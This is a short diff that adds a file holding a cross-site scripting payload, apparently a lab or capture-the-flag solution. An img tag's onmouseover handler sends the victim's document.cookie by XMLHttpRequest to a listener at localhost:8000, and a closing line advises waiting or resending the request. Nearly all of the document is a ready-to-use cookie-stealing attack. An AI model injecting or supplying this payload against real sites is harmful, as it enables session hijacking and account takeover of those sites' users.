@@ -1,0 +1,3 @@
+<img src=# onmouseover="var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://localhost:8000', true); xhr.send(document.cookie);"> 
+
+You might need to wait a bit or send another request.
